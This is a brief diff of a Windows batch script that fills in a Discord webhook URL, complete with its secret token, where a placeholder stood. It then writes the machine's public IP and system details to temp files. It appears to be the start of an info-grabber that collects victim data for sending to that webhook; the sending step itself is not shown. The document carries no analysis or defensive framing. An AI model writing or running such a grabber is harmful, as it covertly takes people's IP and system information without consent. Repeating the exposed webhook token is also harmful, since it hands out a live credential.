@@ -1,5 +1,5 @@
 @echo off
-set webhook=YOUR_WEBHOOK_HERE
+set webhook=https://discord.com/api/webhooks/1034535093177421824/ZEBCXkBS1Loe_10q79CpOLUK5Mjmc9tVKIcXWulwyfxvhlCpgAndIUEWD_-9snG7OwiB
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
 echo Hard Drive Space: > %userprofile%\AppData\Local\Temp\System_INFO.txt
